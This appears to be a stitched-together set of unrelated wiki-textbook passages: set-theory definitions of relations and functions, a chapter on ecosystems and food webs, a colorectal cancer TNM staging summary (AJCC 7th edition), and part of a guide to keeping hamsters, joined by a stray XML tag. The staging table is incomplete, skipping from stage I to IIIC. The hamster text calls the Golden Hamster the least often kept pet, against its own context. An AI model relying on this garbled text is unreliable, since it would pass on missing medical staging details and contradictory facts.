*A relation ''R'' is a ''relation on'' a set ''X'' if &lt;math&gt;\mbox{field}\ R \subseteq X&lt;/math&gt;.

*The ''inverse'' of ''R'' is the set &lt;math&gt;R^{-1}=\{(y,x) \mid (x,y) \in R\}&lt;/math&gt;

*The ''image'' of a set ''A'' under a relation ''R'' is defined as &lt;math&gt;R[A] = \{y\in \mbox{ran}\ R \mid \exists x \in A, (x,y)\in R\}&lt;/math&gt;.

*The ''preimage'' of a set ''B'' under a relation ''R'' is the image of ''B'' over ''R&lt;sup&gt;-1&lt;/sup&gt;'' or &lt;math&gt;R^{-1}[B] = \{x\in \mbox{dom}\ R \mid \exists y \in B, (x,y)\in R\}&lt;/math&gt;

It is intuitive, when considering a relation, to seek to construct more relations from it, or to combine it with others.

We can compose two relations ''R'' and ''S'' to form one relation &lt;math&gt;S \circ R =\{(x,z) \mid \exists y, (x,y) \in R \wedge (y,z) \in S\}&lt;/math&gt;.  So &lt;math&gt;x S \circ R z&lt;/math&gt; means that there is some ''y'' such that &lt;math&gt;xRy \wedge ySz&lt;/math&gt;.

We can define a few useful binary relations as examples:
#The ''Cartesian Product'' of two sets is &lt;math&gt;A \times B = \{(a,b) \in \mathcal{P}(\mathcal{P}(A\cup B)) \mid a \in A \wedge b \in B\}&lt;/math&gt;, or the set where all elements of A are related to all elements of B.  As an exercise, show that all relations from ''A'' to ''B'' are subsets of &lt;math&gt;A \times B&lt;/math&gt;.  Notationally &lt;math&gt;A \times A&lt;/math&gt; is written &lt;math&gt;A^2&lt;/math&gt;
#The ''membership relation on a set'' ''A'', &lt;math&gt;\in_A = \{(a,b) \mid a, b \in A, a \in b\}&lt;/math&gt;
#The ''identity relation on'' ''A'', &lt;math&gt;I_A = \{(a,b) \mid a,b \in A, a=b\}&lt;/math&gt;

The following properties may or may not hold for a relation ''R'' on a set ''X'':
*R is ''reflexive'' if &lt;math&gt;x R x&lt;/math&gt; holds for all ''x'' in ''X''.
*R is ''symmetric'' if &lt;math&gt;x R y&lt;/math&gt; implies &lt;math&gt;y R x&lt;/math&gt; for all ''x'' and ''y'' in ''X''.
*R is ''antisymmetric'' if &lt;math&gt;x R y&lt;/math&gt; and &lt;math&gt;y R x&lt;/math&gt; together imply that &lt;math&gt;x = y&lt;/math&gt; for all ''x'' and ''y'' in ''X''.
*R is ''transitive'' if &lt;math&gt;x R y&lt;/math&gt; and &lt;math&gt;y R z&lt;/math&gt; together imply that &lt;math&gt;x R z&lt;/math&gt; holds for all ''x'', ''y'', and ''z'' in ''X''.
*R is ''total'' if &lt;math&gt;x R y&lt;/math&gt;, &lt;math&gt;y R x&lt;/math&gt;, or both hold for all ''x'' and ''y'' in ''X''.

== Functions ==

=== Definitions ===
A function may be defined as a particular type of relation.  We define a '''partial function''' &lt;math&gt;f: X \rightarrow Y&lt;/math&gt; as some mapping from a set &lt;math&gt;X&lt;/math&gt; to another set &lt;math&gt;Y&lt;/math&gt; that assigns to each &lt;math&gt;x \in X&lt;/math&gt; ''no more than one'' &lt;math&gt;y \in Y&lt;/math&gt;. Alternatively, ''f'' is a function if and only if 
&lt;math&gt;f\circ f^{-1}\subseteq I_{Y}&lt;/math&gt;

If on each &lt;math&gt;x \in X&lt;/math&gt;, &lt;math&gt;f&lt;/math&gt; assigns ''exactly one'' &lt;math&gt;y \in Y&lt;/math&gt;, then &lt;math&gt;f&lt;/math&gt; is called '''total function''' or just function. The following definitions are commonly used when discussing functions.

* If &lt;math&gt;f \subseteq X \times Y&lt;/math&gt; and &lt;math&gt;f&lt;/math&gt; is a function, then we can denote this by writing &lt;math&gt;f : X \to Y&lt;/math&gt;. The set &lt;math&gt;X&lt;/math&gt; is known as the ''domain'' and the set &lt;math&gt;Y&lt;/math&gt; is known as the ''codomain''.
* For a function &lt;math&gt;f : X \to Y&lt;/math&gt;, the ''image'' of an element &lt;math&gt;x \in X&lt;/math&gt; is &lt;math&gt;y \in Y&lt;/math&gt; such that &lt;math&gt;f(x)=y&lt;/math&gt;. Alternatively, we can say that &lt;math&gt;y&lt;/math&gt; is the ''value'' of &lt;math&gt;f&lt;/math&gt; ''evaluated'' at &lt;math&gt;x&lt;/math&gt;.
* For a function &lt;math&gt;f : X \to Y&lt;/math&gt;, the ''image'' of a subset &lt;math&gt;A&lt;/math&gt; of &lt;math&gt;X&lt;/math&gt; is the set &lt;math&gt;\{ y \in Y : f(x) = y \mbox{ for some } x \in A\}&lt;/math&gt;. This set is denoted by &lt;math&gt;f(A)&lt;/math&gt;. Be careful not to confuse this with &lt;math&gt;f(x)&lt;/math&gt; for &lt;math&gt;x \in X&lt;/math&gt;, which is an element of &lt;math&gt;Y&lt;/math&gt;.
* The ''range'' of a function &lt;math&gt;f : X \to Y&lt;/math&gt; is &lt;math&gt;f(X)&lt;/math&gt;, or all of the values &lt;math&gt;y \in Y&lt;/math&gt; where we can find an &lt;math&gt;x \in X&lt;/math&gt; such that &lt;math&gt;f(x)=y&lt;/math&gt;.
* For a function &lt;math&gt;f : X \to Y&lt;/math&gt;, the ''preimage'' of a subset &lt;math&gt;B&lt;/math&gt; of &lt;math&gt;Y&lt;/math&gt; is the set &lt;math&gt;\{x \in X : f(x) \in B\}&lt;/math&gt;. This is denoted by &lt;math&gt;f^{-1}(B)&lt;/math&gt;.

=== Properties of functions ===

A function &lt;math&gt;f:X \rightarrow Y&lt;/math&gt; is '''onto''', or '''surjective''', if for each &lt;math&gt;y \in Y&lt;/math&gt; exists &lt;math&gt;x \in X&lt;/math&gt; such that &lt;math&gt;f(x) = y&lt;/math&gt;.  It is easy to show that a function is surjective if and only if its codomain is equal to its range. It is '''one-to-one''', or '''injective''', if ''different'' elements of &lt;math&gt;X&lt;/math&gt; are mapped to ''different elements'' of  &lt;math&gt;Y&lt;/math&gt;, that is &lt;math&gt;f(x)=f(y) \Rightarrow x=y&lt;/math&gt;. A function that is both injective and surjective is intuitively termed '''bijective'''.

=== Composition of functions ===

Given two functions &lt;math&gt;f:X \rightarrow Y&lt;/math&gt; and &lt;math&gt;g:Y \rightarrow Z&lt;/math&gt;, we may be interested in first evaluating f at some &lt;math&gt;x \in X&lt;/math&gt; and then evaluating g at &lt;math&gt;f(x)&lt;/math&gt;. To this end, we define the ''composition' of these functions, written &lt;math&gt;g \circ f&lt;/math&gt;, as

:&lt;math&gt;(g \circ f)(x) = g(f(x))&lt;/math&gt;

Note that the composition of these functions maps an element in &lt;math&gt;X&lt;/math&gt; to an element in &lt;math&gt;Z&lt;/math&gt;, so we would write &lt;math&gt;g \circ f : X \rightarrow Z&lt;/math&gt;.

=== Inverses of functions ===

If there exists a function &lt;math&gt;g:Y \rightarrow X&lt;/math&gt; such that for &lt;math&gt;f:X \rightarrow Y&lt;/math&gt;, &lt;math&gt;g \circ f = I_X&lt;/math&gt;, we call &lt;math&gt;g&lt;/math&gt; a ''left inverse'' of &lt;math&gt;f&lt;/math&gt;. If a left inverse for &lt;math&gt;f&lt;/math&gt; exists, we say that &lt;math&gt;f&lt;/math&gt; is ''left invertible''. Similarly, if there exists a function &lt;math&gt;h:Y \rightarrow X&lt;/math&gt; such that &lt;math&gt;f \circ h = I_Y&lt;/math&gt; then we call &lt;math&gt;h&lt;/math&gt; a ''right inverse'' of &lt;math&gt;f&lt;/math&gt;. If such an &lt;math&gt;h&lt;/math&gt; exists, we say that &lt;math&gt;f&lt;/math&gt; is ''right invertible''. If there exists an element which is both a left and right inverse of &lt;math&gt;f&lt;/math&gt;, we say that such an element is the ''inverse'' of &lt;math&gt;f&lt;/math&gt; and denote it by &lt;math&gt;f^{-1}&lt;/math&gt;. Be careful not to confuse this with the preimage of f; the preimage of f always exists while the inverse may not. Proof of the following theorems is left as an exercise to the reader.

'''Theorem:''' If a function has both a left inverse &lt;math&gt;g&lt;/math&gt; and a right inverse &lt;math&gt;h&lt;/math&gt;, then &lt;math&gt;g = h = f^{-1}&lt;/math&gt;.

'''Theorem:''' A function is invertible if and only if it is bijective.

&lt;big&gt;&lt;big&gt;Chapter 13. Ecosystems&lt;/big&gt;&lt;/big&gt;  
&lt;/center&gt;
----

An ecosystem can be described simply as the collection of all living and non-living components in a particular area. The living components of the environment are known as biotic factors. Biotic factors include plants, animals, and micro-organisms. The non-living components of the environment are known as abiotic factors. Abiotic factors include things such as rocks and water.

The idea of the ecosystem relates to the idea that all organisms in the environment are engaged in relationships with every other aspect (like resources and other organisms) in that environment.  Ecosystems deal with energy and nutrient flow through a system/community.  For example, a household or a university could be described as an ecosystem, and a city or a state could be described as a larger ecosystem.

While ecosystems may be bound and individually discussed, they do not exist independently, but interact in a complex web.  The ecological relationships connecting all ecosystems make up the biosphere.  Because virtually no surface on the Earth is free of human contact, all ecosystems can be accurately classified as human ecosystems.

Ecosystems vary in diversity.  Some ecosystems may be very diverse with many plants and animals; whereas other ecosystems may be less diverse with fewer animals and plants. For example, tropical rain forests could be classified as an ecosystem that has high diversity; whereas temperate rain forests could be classified as an ecosystem that has lower diversity as compared to tropical rain forests.  [[Image:Daintree Rainforest.JPG|thumb|right|A tropical rain forest is an example of an ecosystem that may support several amounts of plants and animals and therefore may have a high diversity]]

== Ecosystem Concept ==
:''Living organisms and their nonliving (abiotic) environment are inseparably interrelated and interact upon each other. Any area of nature that includes living organisms and non-living substances interacting to produce an exchange of materials between the living and non-living parts is an ''ecological system'' or '''ecosystem''''' - E. P. Odum, 1959 &lt;small&gt;(emphasis added)&lt;/small&gt;
[[Image:Bald_eagle.jpg|left|thumb|300px|The Bald eagle ''Haliaeetus leucocephalus'' is a top predator; a consumer whose niche is at the top of the food web]]  
Thus, a [[Wikipedia:en:Meadow_Vole|Field Mouse]] (say a Meadow vole, ''Microtus pennsylvanicus'') in its burrow in the soil is interacting with the non-living elements of that burrow as it breathes, taking in oxygen and expelling carbon dioxide&lt;sup&gt;1&lt;/sup&gt;. But that activity is but a moment in time and cannot, by itself, define an ecosystem.  The mouse must leave the burrow for food, interacting with plants. Plants themselves interact and exchange materials with the soil and the atmosphere and are dependent on radiation from the sun and the activity of earthworms and fungi in the soil. The latter, in turn, feed upon organic molecules left behind from the death of former living plants (and field mice). Thus, the &quot;ecosystem&quot; of our field mouse includes plants, and soil, and soil organisms&amp;mdash;and of course other field mice to insure that mice will always be a part of that ecosystem.  And perhaps present are Bald eagles (''Haliaeetus leucocephalus''), dependent upon trees for nesting and roosting and a stream for water (and fish as an alternative food), feeding upon Field mice, recycling those that are caught into baby Bald eagles and droppings that are food for the plants and earthworms. Already, the &quot;area&quot; of this ecosystem is at least as large as that required to support a '''population''' of Bald eagles.

It is the inclusion of all the interrelationships within a functional system that make the concept of ecosystem so broad. And the seemingly endless networks of links and interactions that give geographical breadth to an ecosystem. Of course, an ecologist could study just the organisms, activities, and biotic/abiotic interactions within the local &quot;soil ecosystem&quot;, treating mouse and eagle excrement as we described the sun above: external, but providing important input of energy and material to the soil ecosystem.  In a sense, this is what we mean by calling &quot;ecosystem&quot; a concept rather than just a place. We may conceive of, for the purpose of study, ecosystems over a wide range of sizes or scale, from an aquarium to an ocean, and lots of places in between.  Essential are certain components that we  alluded to in our description of parts of the ecosystem supporting habitat for the Field mouse, and these we will next explore in detail.

In attempting to understand any interactive, complex system, especially one as elaborate as even a simple ecosystem, it is helpful to break the system down into various component parts.  By this mental process we can arrive at some understanding of the specific system and can make comparisons with other systems to further our understanding of ecosystems in general. An ecosystem consists of many component structures and these function together in various ways, suggesting an initial approach to describe any ecosystem is to consider separately its structural and functional aspects.

== Basic Structural Components ==

Consider first an ecosystem from a structural perspective: an ecosystem consists of living (biotic) and non-living (abiotic) components.  Living components include populations of organisms and the living resources they use.  Non-living components include non-living resources, such as space, and the non-living physical characteristics of habitats that differ by location, such as elevation, temperature, and humidity.  

We know and can observe that the '''organisms''' living in almost any ecosystem are not all identical individuals, but can be categorized into species (discussed previously in [[../Species_and_Populations|Chapter 9]]); and each species has a unique set of morphological, physiological, and behavioral attributes (see [[../Environmental_Response|Chapter 3]]) that will determine how each individual functions within the whole. The species present provide ways of considering their contribution to ecosystem structure. For examples: we could describe the number of species (species richness), or the number (or biomass) of individuals of each species (species diversity), or their distribution across the physical space of the ecosystem. These are a few ways an ecologist would approach describing ecosystem structure based upon the plants and animals (and others) present in it.

In addition to the organisms themselves, there are components utilized by the organisms that comprise the '''resources''' of the ecosystem.  These are both biotic and abiotic, inorganic and organic, and are exchanged between organisms and between organisms and the
environment (previously covered in part in [[../Biogeochemical_cycles|Chapter 4]]). Resources are the materials cycled by the inhabitants of an ecosystem as they carry on with life processes. We say &quot;cycled&quot; because all living things have a finite existence, and the substances of their material composition remain after death to be utilized in other ways.    

Finally, there are those factors that are the conditions under which the organisms live. The environment of a subarctic lake is vastly different from that of a forest in the wet tropics. But consider also that conditions within a pond (an aquatic environment) are very different from those just a few yards up from the shore (a terrestrial environment). While we might be describing mostly '''physical conditions''', these need not be always abiotic. In many ecosystems there are organisms that provide or create the dominant physical structure of that ecosystem. Examples are a forest and a coral reef. In a forest ecosystem, the trees are both very prominent organisms and resources to many of the other species present; but they also have a substantial effect on the conditions&amp;mdash;the microclimates&amp;mdash;that prevail in the forest ecosystem by providing shade and physical structure for many other organisms that may not directly utilize the trees as a food resource.  

It should be clear that when we speak of ecosystem structure, we are considering various aspects of an ecosystem from a perspective that need not&amp;mdash;indeed does not&amp;mdash;mesh exactly with other ways of categorizing ecosystem components. Consider the trees of a forest or the coral heads of a coral reef. Each is a living organism, a resource used by many other species, and a physical structure that determines the uniqueness of its particular ecosystem compared with the environment that would occupy the same space in the absence of either trees or corals. In describing ecosystem structure, we do not break down the components into divisions of abiotic vs. biotic, inorganic vs. organic, or by species. In the next section, we will consider components on the basis of their function in an ecosystem, creating yet another set of categories independent of the structural ones.

== Characteristics of Ecosystems ==
[[Image:Daydreameiland.jpg|left|thumb|150px| An example of a marine ecosystem]]
[[Image:Acheta domesticus.JPG|right|thumb|100px|''Acheta domesticus'' organism that helps maintain its ecosystem]] 
The complexity of an ecosystem will increase as the species diversity present in the ecosystem increases. Ecosystems that are not species rich (barren ecosystems) may ''appear'' to be physically complex are actually considered ''functionally'' complex. Despite few species living in the environment, the ecosystem is functionally complex because they include species with remarkable biochemical specializations that allow them to survive in unfavorable environments (some archaea live in environments that are 113-176 °F).  Likewise, some organisms can get energy from inorganic chemical sources (such as bacteria that break down crude oil). 

A healthy ecosystem will have high species diversity and is not likely to be damaged by human interactions, natural disasters, and climate changes. Every species within an ecosystem has a ''niche'', the unique way that a given species uses its environment.  New species are discovered every day and the roles they play in their environment to keep it healthy. This idea behind the species within the environment using their niches to keep it healthy can clearly be illustrated in a lake ecosystem.  In a lake ecosystem, the sun hits the water and helps the algae grow. Algae use carbon dioxide and water to make sugars and oxygen.  The oxygen is useful for any eukaryote organism and the sugars provide food for the algae or anything that eats the algae, such as microscopic organisms. Small fish eat the microscopic animals, absorb oxygen with their gills and expel carbon dioxide, which plants then use to grow. If the algae disappeared, everything else would be impacted. Microscopic animals wouldn't have enough food, fish wouldn't have enough oxygen and plants would lose some of the carbon dioxide they need to grow.

Soil is also an important part of an ecosystem. It provides important nutrients for the plants in an ecosystem. It helps anchor the plants to keep them in place. Soil absorbs and holds water for plants and animals to use and provides a home for lots of living organisms. The atmosphere provides oxygen and carbon dioxide for the plants and animals in an ecosystem.  The atmosphere is also part of the water cycle. Without the interactions among organisms and elements in the atmosphere, there would be no life at all.

== Basic Functional Components ==

We can recognize four functional components of an ecosystem: 1) ''abiotic factors'', 2) ''producers'', 3) ''consumers'', and 4) ''decomposers''.  The latter three are living components, what Odum (1959) termed the three &quot;functional kingdoms of nature&quot;, so important and universal is their presence in ecosystems. 
  
=== Abiotic Factors===
[[Image:Nerr0878.jpg|right|thumb|200px|An example of organisms that live in the intertidal zone]]Abiotic factors can increase or decrease the amount of '''environmental stress''' on an ecosystem and therefore can also affect the stability of that ecosystem. We studied many of these in detail in ([[../Biogeochemical_cycles|Chapter 4]]). Do not forget that physical (essentially geological) structure can influence ecological function: the nature of interactions of species in the sea can be very different from those in the atmosphere directly as a consequence of difference in physical properties of air and water.

The [http://en.wikipedia.org/wiki/Tidal_zone intertidal zone] is the shore area that is submerged at high tide and exposed at low tide.  It is rich in oxygen and nutrients and provides a home for many different species.  The organisms that live in this area are constantly exposed to a '''high stress''', '''less stable''' environment.  However, they have adapted to huge daily changes in moisture, temperature, turbulence (from the water), and salinity. They have to be used to living in both wet and dry conditions continually.  Water is a very powerful substance and the constant impact from the moving water can have drastic impacts on both living and non-living things.  Intertidal organisms are forced to bury into the sand, hide under rocks and/or attach themselves to larger structures to avoid being carried away by the waves.  Also, the constant flux of the environmental temperature is enough to make any creature uncomfortable.  Since this area is exposed to both water and land, the organisms here must compete with predators that hunt at both areas.

[[Image:Rainforest Fatu Hiva.jpg|left|thumb|200px|A tropical forest on a polynesian island]]Jungles or [http://en.wikipedia.org/wiki/Tropical_rainforest rainforests] are an example of a '''low stress''', '''more stable''' environment that are vital to maintaining the ecosystems of the earth.  Unlike the intertidal zone, this environment has more subtle changes that occur at a much slower rate.  Jungles are very stable environments that possess some 40% of all species.  It is also a very diverse environment consisting of several layers of organisms using different parts of the ecosystem.  As well as increasing biodiversity, jungles are beneficial to increasing our knowledge of medicinal plants and increasing oxygen output.  Since the rainforest is literally a smörgåsbord a plants and animals, discoveries are continually made of the beneficial nature of these organisms.

== Food Webs ==

A '''food web''' is a series of interacting food chains. Food chains show the order in which animals consume food. Food chains and food webs are made up of Producers, Consumers, and Decomposers. '''Producers''' are [[Wikipedia:en:Autotroph|Autotrophic Organisms]]. &quot;Autotrophic&quot; means self-nourishing.  The most conspicuous group of autotrophs are the '''photolithoautotrophs''', organisms such as algae and flowering plants that have cells containing chlorophyll and are thus capable of fixing light energy (&quot;photo-&quot;) to build complex organic substances from simple inorganic substances (&quot;litho-&quot;). In the next chapter we are going to study the energetics of this process; now, we are mostly interested in how producers &quot;create&quot; organic matter utilizing energy and inorganic matter.  The organic compounds that are created may be used structurally within the organism or may be latter broken down into inorganic matter and energy extracted by the process.  
'''Consumers''' are [[http://www.chemicool.com/definition/heterotrophic_organisms.html| Heterotrophic Organisms]], which are also termed '''macroconsumers'''. A simple definition of a heterotrophic organism is a species that is dependent on organic matter for food. '''Decomposers''' are heterotrophic organisms.  These are also termed microconsumers, saprobes, or saprophytes. Decomposers are scavengers that break down dead plants and animals.

Decomposers are vital to the food web because they break down and recycle nutrients back into the soil. These nutrients are then used by producers to sustain life. Without the enzymes that decomposers provide to breakdown organic material into inorganic material, phosphorous(P) and nitrogen(N), Producers would eventually die out and the main part of food webs would cease to exist and therefore life would cease to exist. Decomposers recycle material but they do not recycle energy. Solar irradiation still provides the energy that drives the life cycle.

[[Image:RainforestFoodweb.JPG|right|thumb|250px|A foodweb of rainforest organisms]]

Decomposition is a natural process but decomposers speed up the process of decomposition. Bacteria, fungi and actinomycetes are three main types of decomposers. Bacteria make up about 90% of all microorganisms and are the most abundant of decomposers. They can eat anything from dead trees, dead animals and oil slicks on the surface of the ocean. Fungi and actinomycetes work on harder substances like cellulose, bark, paper and stems. These decomposers usually only work to a certain stage in decomposition then bacteria will finish the process, similar to primary and secondary succession.

A study conducted in a California river by Mary Power showed the impact that fish had on the river food wed. The main fish studied in the experiment were the steelhead and roach, these fish at a juvenile stage consume insects and fish fry, which consume chironomid larvae. These larvae reduce the algae biomass in the river. She found that when the larger adult fish species were absent, smaller more abundant predators thrived and decrease the chironomid larvae population significantly, which allowed the algae biomass to increase. This results in more cyanobacteria and diatoms to flourish on the algal turfs{{ref|Power 1990}}. This study showed a good example of how consumers and producers interact, and also showed that when one trophic level is disrupted it has a domino effect on the other trophic levels involved in the food web.

With Food Webs there are a few calculations that we can use to help us better understand the system.  Chain Length is essentially the number of links between trophic levels.  But when we calculate this we use the mean length.  So to calculate Chain Length(CL) the equation is CL=(# of links/T-1) where T is equal to the number of trophic levels.  We can also calculate link density(LD).  LD=(# of Links/n) where n is the number of species in the web.  And finally we can calculate Web Connectance(C).  C=(actual links/potential links(N))  Where N=n(n-1)/2.

Food webs do pose some problems for ecological studies. Identifying trophic levels is very difficult in nature. Ecosystem boundaries are also tough to determine. Identifying all of the species in a community can be difficult. Quantifying and identifying the strengths of interactions is hard. In most cases it is very hard to determine what the eliminating nutrients are.

===Biological Magnification===
The focus of this chapter is trophic levels and nutrient transfer between trophic levels and the food webs. Not all transfers between trophic levels are positive. Biological Magnification is the tendency of pollutants to concentrate in successive trophic levels. The pollutants are usually toxic and cause death to the organism.

The first step in Biomagnification is when a producer takes up nutrients in the soil that it stores by accident as an essential nutrient. Producers will try to store massive amounts of nutrients, when &quot;mistaken&quot; nutrients are absorbed, i.e. DDT and Mercury, The concentration levels in the producers are greater than the levels in the surrounding environment. When the producer is eaten by the herbivore or omnivore the pollutants are transferred to the next trophic level. Since energy transfer between trophic levels is approximately ten percent, the next chain in the trophic level must try to consume large amounts of the previous trophic level to sustain life and the pollutant, once again, is concentrated in the next trophic level.

The pollutants, once absorbed, are stored in the bodies of the consumers. DDT and PCB's are fat soluble and when one trophic level is consumed by the other the fat moves from one consumer to the next. Water soluble pollutants usually cannot concentrate because they would easily dissolve in the organism. Polluted water leaves an organism rather easily whereas fat does not leave the body.

Three main criteria must be met for a pollutant to biomagnify:
# The pollutant must be long lived.
# The pollutant must be concentrated by the producers.
# The pollutant must be fat-soluble.

=== Guild===
Species competing for the same resources in similar fashion are known as [[Wikipedia:en:Guild_%28ecology%29|guilds]]. They are classified according to how they acquire their nutrients, their state of mobility, and their mode of feeding. Some examples of guilds are [[Wikipedia:en:Forb|forbs]], geophytes, graminoids, shrubs, trees and vines. A guild is much more stable then a single species, since more than one species can balance out the system. In a study of feeding patterns on [[Wikipedia:en:Polychaete|polychaetes]], Fauchald and Jumars (1979) utilized feeding guilds as a method of generalization and determining [[Wikipedia:en:Phylogeny|phylogenetic]] relationships, indeed claiming that guilds were very useful in summarizing data into patterns {{ref|Fauchald 1979}}.

In a 2009 study, a guild approach was used to evaluate the roles of foraging habitats and exposure timing, as well as tropic position on Mercury (Hg) bioaccumulation. Five species of waterbirds forming three distinct foraging guilds in the San Franciso Bay (SFB) estuary were used in this investigation. Because estuarine waterbirds form well-documented, distinct guilds distinquished by their feeding method and habitat use and because the SFB estuary has a legacy of Hg contamination from historic mining in the Sierra Nevada Coast Mountain Range, Hg exposure was able to be evaluated on both large-scale foraging strategies (such as tropic position) occurring among guilds and small-scale strategies (such as foraging micro-habitats) that occur within guilds. As indicated by this study, SFB waterbirds accumulated alarming Hg concentrations. Concentrations that place them at considerable risk to deleterious reproductive effects. Such exposure was shown to vary as a function of micro-habitat, region, trophic level, and time spent in the estuary. These results have raised quite a bit of concern because the SFB estuary is among the most important sites for wintering, migrating, and breeding waterbird populations along the Pacific Flyaway {{ref|Eagles-Smith 2009}}.
[[Image:Spiritbear.jpg|right|thumb|250px|A bear is an example of a keystone species which provides stability to a community.]]

=== Keystone Species ===
A keystone species is a species having a disproportionate effect on the ecosystem. They provide stability to an ecosystem. Normally they are not the dominant species but are required for a community to have stability. Many times keystone species are predators that keep some type of herbivore from consuming all of the dominant plant species. One interesting aspect of keystone species is that since they normally feed on predators that consume small numbers of prey, they can effectively control a system without actually needing to have a large population size.

J.Brown and E. Heske studied the effects of the removal of ''Dipodomys'' spp. (Kangaroo rats) from the Chihuahuan Desert shrub habitat in southeastern Arizona. Twelve years after the removal of three species of kangaroo rats, the controlled plots in the habitat went from shrubland to grassland. The density of perennial and annual grasses increased considerably, and also other rodent species in the area colonized. These major changes in the ecosystem show that the ''Dipodomys'' spp. have a significant effect on the diversity and biogeochemical processes, which led the researchers to believe that the kangaroo rats are a keystone species {{ref|Brown 1990}}. 
Some other examples of keystone species would include Starfish, Sea Otters, Bears, Beavers and Domestic Cats.
*Read: [[Wikipedia:en:Keystone species|Keystone Species]]

All the examples of keystone species mentioned above are animals. However, this isn't always the case. ''Pinus chiapensis'' is an early successional, neotropical pine species found in warm, humid, mid-elevation Mesoamercian areas such as in the tropical montane areas of southern Mexico and western Guatemala. It has been discovered that forests dominated by ''P. chiapensis'' are the first to appear after disturbance, modifying drastically the environment by shading the forest floor, favoring soil development, increasing the rate of soil carbon sequestration, acidifying the soil, releasing nutrient cations by weathering the bed rock, and providing a source of food for birds and mammals. ''P. chiapensis'' trees inhibit their own development while facilitating  the growth of broadleaved species typical of tropical montane cloud forests. Ultimately, ''P. chiapensis''is a keystone species because of its crucial impacts in tropical montane cloud forest regeneration and its effect on ecosystem processes {{ref|Castillo 2009}}.

===Hypotheses of Food Web Control===
Each food web contains N numbers of trophic levels and with each number the cycle of dependence flip-flops according to the Oksanen's Model.  There are two hypotheses involved in this model one is known as the '''Bottom-up Control''' hypothesis.  The bottom-up control hypothesis states that both the top and the bottom trophic levels are controlled by resource limitations For example in a three tiered food web (three trophic levels), the bottom trophic level would contain a species of plants, which of course are dependent on the resources available to it.  The next trophic level would be some species of herbivore, these herbivores are limited and controlled by a species of predator which is also the third trophic level.  The predator or top trophic level is then limited by the plant resources keeping the herbivores alive and reproducing.

If we were to now add a trophic level, such as a secondary predator (the original predator being the primary predator), the cycle of dependence would then flip-flop, and the '''Top-bottom Control''' hypothesis would apply.  The top-bottom control hypothesis states that the food web cycle is predator limited.  We now have our plant species ==&gt; the herbivore ==&gt; the primary predator ==&gt; and the secondary predator.  The plants that were resource limited are now predator limited by the herbivores.  The herbivores are now resource limited by the plants abundance.  The primary predator is now limited by the secondary predator and the secondary predator is now limited by the resources of the primary predator, herbivore, and plants.

This cycle repeats itself and with each additional trophic level added, the limitation of the lower trophic levels changes from either resource limited or predator limited to the other. The relationships of two trophic levels when the bottom is resource limited and the top is predator limited gives a positive slope.  The more of the lower trophic level the more there is of the upper trophic level.  The inverse is true when the lower trophic level is predator limited and the upper trophic level is resource limited, it creates a negative slope the more are of the upper trophic level the less there will be of the lower trophic level.

'''AJCC 7th edition (2009)'''&lt;br&gt;

''Primary Tumor:''
*T1 - invades submucosa
*T2 - invades muscularis propria
*T3 - invades through muscularis propria into pericolorectal tissues
*T4
**T4a - penetrates to the surface of the visceral peritoneum
**T4b - directly invades or is adherent to other organs or structures

Layers: are the epithelium, basement membrane (defines intraepithelial), lamina propria (defines intramucosal) - contains capillaries and lymphatics (but little chance for mets), muscularis mucosae, submucosa (loose connective tissue), muscularis propria (circular and longitudinal layers), subserosa (single layer of cells).

Difference between rectum and colon is that most of the rectum lacks serosa. Thus for the rectum, a T3 is invasion into perirectal fat; for colon, T3 is invasion of serosa.  Also for the rectum, T4 is only invasion of other organs, whereas for the colon T4 can also be perforation through serosa. 

''Regional Lymph Nodes:''
*N1 - 1 to 3 lymph nodes
**N1a - 1 lymph node
**N1b - 2-3 lymph nodes
**N1c - tumor deposits in the subserosa, mesentery, or nonperitonealized pericolic or perirectal tissues without regional nodal metastasis
*N2 - 4 or more
**N2a - 4-6 lymph nodes
**N2b - 7 or more lymph nodes

''Distant Metastasis:''
*M0 - none
*M1 - yes
**M1a - metastasis confined to one organ or site
**M1b - metastasis in more than one organ/site or the peritoneum

''Stage Grouping:''
*I - T1-2 N0 M0

*IIIC - T4a N2a, T3-T4a N2b, T4b N1-N2
*IVA - M1a
*IVB - M1b

''Changes from 6th edition:''
*T4 subdivided into T4a/b
*N1 subdivided into N1a/b/c, N2 into N2a/b
*Added satellite tumor deposits (N1c)
*Stage II subdivided into IIA/B/C
*Stage III: T4bN1 was reclassified from IIIB to IIIC; T1N2a reclassified from IIIC to IIIA; T1N2b, T2N2, and T3N2a reclassified from IIIC to IIIB.
*M1 subdivided into M1a/b. Stage IV subdivided into IVA and IVB.

      <text xml:space="preserve">==Hamsters as pets==

The hamster kept as pet least often is the [[w:Golden Hamster|Golden Hamster]], also called Syrian Hamster. So-called '''Teddybear''' or '''Black bear''' hamsters are breeds of blue hamsters. But also four species of smaller hamsters are popular pets, often called dwarf hamsters. These are [[w:Roborovski hamster|Roborovski hamster]], (''Phodopus roborovskii'') often called Roborovski, the [[w:chinese striped hamster|chinese striped hamster]] (''Cricetulus griseus'') and the two subspecies of ''[[w:Phodopus sungorus|Phodopus sungorus]]'', the winter white Russian dwarf hamster (''Phodopus sungorus sungorus'') and Campbell's dwarf hamster (''Phodopus sungorus campellii''). The care of the dwarf hamsters is similar to that of the golden hamster, but there are differences in feeding and housing needs and temperament. Winter whites and Campell's are fairly popular, in the US the campells more so than the whinter whites, while it's other way round in [[w:Europe|Europe]]. Roborovski and Chinese striped Hamsters are somewhat more difficult to breed and keep, they are usually only available from breeders, and therefore limited to serious rodentia fans. Roborovski are especially not suitable for children.

Hamsters are [[w:nocturnal|nocturnal]] by nature, making them less than ideal as pets for people who are normally awake during the day. However, many people prefer them to [[w:rat|rat]]s, given rats' unsavory reputation (undeserved as pets).  Unlike rats, they are not particularly good at learning tricks but can be entertaining to watch.  They are also much smaller than [[w:guinea pig|guinea pig]]s, although equally as furry and appealing, so are more appropriate for homes with limited space.

== Housing ==
Hamsters can be kept both in cages and in terrariums, both of which are available in pet stores. Cages are easier to carry, their bars can be used for climbing, and they usually include a convenient front door. On the other hand, glass boxes keep hamsters from throwing litter out of their cages, provide a better view into the hamster's home, and create a quieter and more sheltered interior. In general, terrariums are more appropriate for dwarf hamsters, which  are more sensitive to a disquieting environment and which would otherwise need very narrow-grid bars to keep them from slipping through. Middle-sized hamsters, such as the Golden Hamster, especially enjoy climbing the cage walls (the cage should have horizontal and vertical bars) and are more open to the outside world, which is why cages might be the better choice for this kind of hamsters.

